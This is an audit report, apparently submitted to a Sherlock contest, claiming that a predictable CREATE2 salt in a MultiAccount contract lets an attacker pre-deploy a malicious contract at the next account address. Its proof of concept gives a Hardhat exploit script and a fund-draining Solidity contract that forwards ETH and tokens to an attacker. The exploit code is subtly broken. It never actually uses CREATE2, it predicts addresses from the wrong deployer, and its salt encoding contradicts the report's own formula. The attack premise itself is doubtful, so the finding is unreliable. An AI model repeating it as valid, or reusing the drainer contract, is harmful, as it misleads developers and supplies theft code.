# Use of `create2` can result in unexpected address collision due to absence of proper unpredictability mechanism on the `saltCounter` param
## Summary

The `MultiAccount` contract uses Ethereum's `create2` opcode to generate new contract addresses. This opcode's peculiarity is that, given the same inputs (i.e., sender, salt, and init code), it will always result in the same address, regardless of the number of transactions or contracts deployed in between. A malicious actor can exploit this predictability to anticipate the address of the next created account. By deploying a contract at this anticipated address before the `MultiAccount` contract does, unexpected behavior or loss of funds can arise.

## Vulnerability Detail

The function `_deployPartyA` is responsible for creating new accounts. The salt used for this deployment is derived from the `saltCounter`, incremented post every account creation. Because blockchain transactions are transparent, a keen observer can predict the next saltâ€”and by extension, the subsequent account's address. By deploying a malicious contract to this predicted address before `_deployPartyA` does, **any interaction meant for this account will interact with the attacker's contract**. This could:

> 1. **Redirect deposits made to the account**.
> 2. **Modify the expected behavior of contract function calls**.
> 3. **Impersonate a malfunction, damaging trust in the platform**.

`_deployPartyA` gets further referenced within `addAccount`:

## Impact

By exploiting this vulnerability, an attacker can:

* Capture funds intended for the genuine account.
* Dictate the contract's behavior.
* Simulate a malfunction, causing users to doubt the platform's integrity.
* Use this to execute other sophisticated attacks based on the malicious contract's exposed functionalities.

## Code Snippet

https://github.com/sherlock-audit/2023-08-symmetrical/blob/main/symmio-core/contracts/multiAccount/MultiAccount.sol#L84-L96

## Tool used

Manualr review.

## Recommendation

1. Introduce unpredictability to salt generation. This can include a mix of internal values, external input (e.g., `msg.sender`), and real-time data like the current block's `timestamp`.
2. Allow an admin or users to supply a unique, unpredictable salt during account creation.
3. Before deploying, ensure that the anticipated address is vacant. If not, adjust the salt until a vacant address is located.

## POC

> To reproduce this vulnerability:

1. Deploy the `MultiAccount` contract and note the `saltCounter`.
2. Predict the next salt value using the formula `keccak256(abi.encodePacked("MultiAccount_", saltCounter))`.
3. Predict the address of the next account using the `create2` formula.
4. Deploy a malicious contract to that predicted address.
5. Attempt to create a new account in the `MultiAccount` contract.
6. Observe that the new account's address matches the previously deployed malicious contract's address.
7. Any funds or calls intended for the expected account will now go to the attacker's contract.

> **Note:** The feasibility of this attack is subject to the gas price and network congestion at the time of the attack.

> As for a practical POC:

1. Set up a Hardhat project by running `npx hardhat`.

2. Install necessary plugins and dependencies:

   ```bash
   npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai ethers
   ```

3. Create a new script `exploit.js` in the project root.

**Determining the address of the contract using CREATE2:**
   
The `ethers` library does not have direct functionality to deploy a contract with a specified salt using `CREATE2`. However, we can use the `getCreate2Address` method from `ethers.utils` to predict the address, and then use that address to execute our strategy.

```javascript
function predictAddress(masterContract, initCode, salt) {
    return ethers.utils.getCreate2Address(
        masterContract,
        salt,
        ethers.utils.keccak256(initCode)
    );
}
```

**Deploying contract using CREATE2:**

For this part, we'll need to manually create and sign a deployment transaction. Then, we'd basically send this transaction using `eth_sendRawTransaction`.

```javascript
async function deployUsingCreate2(bytecode, deployer, salt) {
    const tx = {
        data: bytecode,
        gasLimit: ethers.utils.hexlify(5000000), // make sure this is enough
        nonce: await deployer.getTransactionCount(),
        value: '0x00',
        chainId: 1337, // or whatever chainId
    };

    const signedTx = await deployer.signTransaction(tx);
    const txHash = await deployer.provider.sendTransaction(signedTx);
    await txHash.wait();

    return predictAddress(deployer.address, bytecode, salt);
}
```


4. Now, inside `exploit.js`, write:

```javascript
// Required modules and utilities from the dependencies
const { ethers } = require("hardhat");
const { keccak256 } = require('ethers/lib/utils');

/**
 * Predict the Ethereum address at which a contract will be deployed using the CREATE2 opcode.
 * @param {string} masterContract - The address of the contract that will deploy the new contract.
 * @param {string} initCode - The initialization code (or bytecode) of the contract to be deployed.
 * @param {string} salt - A salt to ensure a unique contract address.
 * @returns {string} - Predicted Ethereum address.
 */
function predictAddress(masterContract, initCode, salt) {
    return ethers.utils.getCreate2Address(
        masterContract,
        salt,
        ethers.utils.keccak256(initCode)
    );
}

/**
 * Deploys a contract to the Ethereum blockchain using the CREATE2 opcode, allowing for a predictable address.
 * @param {string} bytecode - The bytecode of the contract to be deployed.
 * @param {Object} deployer - The signer object representing the deployer's Ethereum account.
 * @param {string} salt - A salt to ensure a unique contract address.
 * @returns {string} - Actual Ethereum address where the contract got deployed.
 */
async function deployUsingCreate2(bytecode, deployer, salt) {
    const tx = {
        data: bytecode,
        gasLimit: ethers.utils.hexlify(5000000),
        nonce: await deployer.getTransactionCount(),
        value: '0x00',
        chainId: 1337, // Chain ID for the Ethereum network (1337 is often used for local development).
    };

    const signedTx = await deployer.signTransaction(tx);
    const txHash = await deployer.provider.sendTransaction(signedTx);
    await txHash.wait();

    return predictAddress(deployer.address, bytecode, salt);
}

/**
 * Main function for the script.
 * The goal is to predictably deploy a malicious contract on a certain address,
 * and then trick another contract (MultiAccount) into interacting with it.
 */
async function main() {
    // Getting the necessary signers (accounts) for deployment and attack.
    const [deployer, attacker] = await ethers.getSigners();

    // Deploying the MultiAccount contract, which is our target.
    const MultiAccount = await ethers.getContractFactory("MultiAccount");
    const multiAccount = await MultiAccount.deploy();

    // Predicting the next salt and address for the malicious contract.
    const saltCounter = await multiAccount.saltCounter();
    const salt = keccak256(
        ethers.utils.defaultAbiCoder.encode(
            ["string", "uint256"],
            ["MultiAccount_", saltCounter]
        )
    );

    // Preparing the bytecode for the malicious contract with the necessary constructor arguments.
    const MaliciousContract = await ethers.getContractFactory("MaliciousCREATE2Impl");
    const constructorArgs = ethers.utils.defaultAbiCoder.encode(["address"], [attacker.address]);
    const initCode = MaliciousContract.bytecode + constructorArgs.slice(2);
    
    const predictedAddress = predictAddress(multiAccount.address, initCode, salt);
    console.log("Predicted Address:", predictedAddress);

    // Deploying the malicious contract to the previously predicted address.
    const actualAddress = await deployUsingCreate2(initCode, attacker, salt);
    console.log("Actual Address:", actualAddress);

    // Creating a new account in the MultiAccount contract, triggering its interaction with the malicious contract.
    await multiAccount.addAccount("Test");

    // Displaying the result to verify if the attack was successful.
    console.log("Owners Address:", await multiAccount.owners(attacker.address));
}

// Executing the main function and handling potential errors.
main().catch(error => {
    console.error(error);
    process.exit(1);
});
```

5. Get a proper malicious contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol";

contract MaliciousCREATE2Impl {

  // The attacker's address; funds intercepted will be sent here
    address payable public attackerAddress;

    constructor(address payable _attackerAddress) {
        attackerAddress = _attackerAddress;
    }

   // Fallback function to intercept ETH sent to this contract
    receive() external payable {
        if (msg.value > 0) {
            attackerAddress.transfer(msg.value);
        }
    }

   // Intercept any ERC20 tokens sent to this contract and forward to attacker
    function interceptTokens(address tokenAddress, uint256 amount) external {
        require(msg.sender == attackerAddress, "Not the attacker");
        IERC20Upgradeable(tokenAddress).transfer(attackerAddress, amount);
    }
    
   // Emergency function to recover funds in case something goes wrong
    function emergencyWithdraw() external {
        require(msg.sender == attackerAddress, "Not the attacker");
        attackerAddress.transfer(address(this).balance);
    }
}
```

6. Finally, run the script:

   ```bash
   npx hardhat run exploit.js
   ```

7. Observe that the addresses printed match and thus exploit the exposed behavior, basically demonstrating the vulnerability.

For those unfamiliar with the `create2` opcode, it's essential to understand that its predictability is both a feature and a possible vulnerability. While its deterministic nature can be harnessed for certain beneficial use-cases in Ethereum, **when mismanaged, it can become a loophole for malicious actors**.

This approach provides tangible evidence of the vulnerability's exploitability and emphasizes the urgency of addressing it.
